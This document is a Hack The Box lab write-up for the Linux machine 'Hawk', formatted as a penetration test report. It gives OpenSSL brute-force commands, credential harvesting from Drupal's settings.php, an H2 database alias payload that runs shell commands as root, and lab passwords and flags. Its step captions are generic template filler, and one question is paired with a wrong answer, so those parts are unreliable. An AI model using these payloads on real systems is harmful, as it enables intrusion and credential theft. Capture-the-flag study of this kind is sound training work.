---
title: "OffSec Assessment: Hawk (Hack The Box) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for Hawk (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
tags: cybersecurity, hackthebox, pentesting, infosec
series: "HackTheBox Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_01.png"
---

# Offensive Security Assessment Report: Hawk

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Hawk** hosted on **Hack The Box**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Public-Facing Network Service Exploitation
* **Privilege Escalation Vector:** Local Privilege Escalation
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | Hawk |
| **Platform** | Hack The Box |
| **Operating System** | Linux |
| **Difficulty Rating** | Medium |
| **Associated CVE(s)** | N/A |
| **Initial Foothold Vector** | Public-Facing Network Service Exploitation |
| **Privilege Escalation Vector** | Local Privilege Escalation |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Public-Facing Network Service Exploitation
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Local Privilege Escalation
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

> **Assessment Query / Target Milestone:** How many open TCP ports are listening on Hawk?

* **Observed Evidence / Output:** 6


![step_01.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.



> **Assessment Query / Target Milestone:** What content management system is running on TCP port 80?

* **Observed Evidence / Output:** drupal


![step_02.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.



![step_03.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the name of the encrypted file available on the FTP server?

* **Observed Evidence / Output:** .drupal.txt.enc


![step_04.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What program is responsible for encrypting `.drupal.txt.enc`?

* **Observed Evidence / Output:** openssl


![step_05.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What user is running the Drupal blog on Hawk?

* **Observed Evidence / Output:** PencilKeyboardScanner123


![step_06.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx
for i in $(seq 0 8 176); do                                                          
python3 -c "import sys; sys.stdout.buffer.write(b'A'*$i)" > "$i"
done
```

```jsx
cat > [encrypt.sh](http://encrypt.sh/) <<'BASH'                                                             
#!/usr/bin/env bash
set -euo pipefail
PASS='PleaseSubscribe'
```

```jsx
while IFS= read -r cipher; do
[[ -z "$cipher" || "$cipher" =~ ^# ]] && continue
for length in $(ls -1 | grep -E '^[0-9]+$' | sort -n); do
out="${length}.${cipher}.enc"
echo "=> openssl enc -$cipher -e -in $length -out $out -k *****"

if ! openssl enc -"$cipher" -e -in "$length" -out "$out" -k "$PASS" 2>/dev/null; then
echo "[!] skipping cipher $cipher (not supported?)"
rm -f "$out"
fi
done
done < cipher.lst
BASH
```

```jsx
cat > cipher.lst <<'EOF'                                                            
aes-256-cbc
aes-192-cbc
aes-128-cbc
aes-256-ofb
aes-128-ofb
rc4
aria-128-cbc
des
EOF
```

```jsx
wc -c * | grep '176 ‘
```

```jsx
sudo apt update                                                                        
sudo apt install -y bruteforce-salted-openssl
```

```jsx
base64 -d .drupal.txt.enc > drupal.openssl 
```

```jsx
bruteforce-salted-openssl -t 8 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d md5 drupal.openssl
```

```jsx
bruteforce-salted-openssl -t 8 -f /usr/share/wordlists/rockyou.txt -c aes-256-cbc -d sha256 drupal.openssl
```

```jsx
openssl enc -d -aes-256-cbc -md sha256 -salt -in drupal.openssl -out drupal.txt -k 'friends'

```


> **Assessment Query / Target Milestone:** What user is running the Drupal blog on Hawk?

* **Observed Evidence / Output:** www-data


![step_07.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_08.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_09.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_09.png)
* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What is the drupal user's password to connect to the MySQL database?

* **Observed Evidence / Output:** drupal4hawk


![step_10.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_10.png)
* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.


```jsx
www-data@hawk:/var/www/html/sites/default$ cat settings.php

```

**Submit the flag located in the daniel user's home directory.**

* **Observed Evidence / Output:** a5fd7a6995ba44600da05a092e788b3c


![step_11.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_11.png)
* **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.


**On what TCP port is the H2 database listening?**

* **Observed Evidence / Output:** 8082


![step_12.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_12.png)
* **Assessment Step 12:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_13.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_13.png)
* **Assessment Step 13:** Command execution output, exploit delivery proof, or auxiliary evidence.



> **Assessment Query / Target Milestone:** What user is the H2 database running as?

* **Observed Evidence / Output:** root

**Submit the flag located in the root user's home directory.**

* **Observed Evidence / Output:** a97fc889aa3e581c5a1b05dab89d802a

```jsx
DROP ALIAS IF EXISTS SHELLEXEC;
CREATE ALIAS SHELLEXEC AS $$
String shellexec(String cmd) throws java.io.IOException, InterruptedException {
String[] c = {"/bin/sh","-c", cmd};
Process p = Runtime.getRuntime().exec(c);
java.io.InputStream both =
new java.io.SequenceInputStream(p.getInputStream(), p.getErrorStream());
java.util.Scanner s = new java.util.Scanner(both);
s.useDelimiter("\\A");
String out = s.hasNext() ? s.next() : "";
p.waitFor();
return out;
}
$$;
```


![step_14.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_14.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.



![step_15.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/hawk/images/step_15.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Public-Facing Network Service Exploitation) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Local Privilege Escalation) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
